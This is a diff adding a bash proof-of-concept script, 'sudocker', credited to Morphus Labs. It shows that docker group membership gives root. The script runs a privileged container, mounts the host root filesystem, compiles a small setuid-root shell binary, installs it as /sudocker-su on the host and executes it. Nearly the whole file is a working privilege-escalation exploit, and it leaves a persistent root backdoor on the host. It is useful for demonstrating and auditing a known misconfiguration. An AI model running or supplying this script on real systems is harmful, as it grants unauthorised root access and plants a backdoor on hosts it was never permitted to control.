@@ -1,0 +1,59 @@
+#!/bin/bash
+#
+# sudocker: become root by being on the docker group
+#
+# Copyright (C) 2018  Morphus Labs
+#
+#
+# "Anyone added to the docker group is root equivalent"
+#         -- https://wiki.archlinux.org/index.php/Docker
+#
+# "This needs more prominent documentation. Yes it's there, half way down
+#  the page, but it's effectively hidden in a "security speak" document."
+#         -- @markriggins, https://github.com/docker/docker/issues/9976
+#
+# "First of all, only trusted users should be allowed to control your Docker
+#  daemon."
+#         -- https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface
+#
+#
+# NOTE: this proof-of-concept installs "/sudocker-su" on "/",
+#       remember to delete it afterwards.
+
+DEBUG=true
+
+errxit() {
+	echo "$0: $@"
+	exit 1
+}
+
+debug() {
+	[ -n "$DEBUG" ] && echo "$@"
+}
+
+[ -f /sudocker-su ] && exec /sudocker-su
+debug "\`\`/sudocker-su'' does not exist, using docker run to create it"
+groups | grep -q " docker " || errxit "not in the docker group, abort."
+root=$(mount | grep " / " | sed -e "s/ .*//")
+debug "root is $root"
+docker images | grep -q "^ubuntu " || docker pull ubuntu
+docker run --rm -ti --privileged ubuntu /bin/bash -c "
+mount $root /mnt
+apt-get -qy update
+apt-get -qy install gcc
+cat > sudocker-su.c <<SUDOCKER-SU
+#include <unistd.h>
+int main() {
+	char *argv[]={\"/bin/bash\",NULL};
+	setuid(0);
+	setgid(0);
+    execvp(\"/bin/bash\",argv);
+    return 0;
+}
+SUDOCKER-SU
+gcc sudocker-su.c -o /mnt/sudocker-su
+chmod 4755 /mnt/sudocker-su
+umount /mnt
+"
+debug "\`\`/sudocker-su'' is installed, attempting to run it"
+exec /sudocker-su
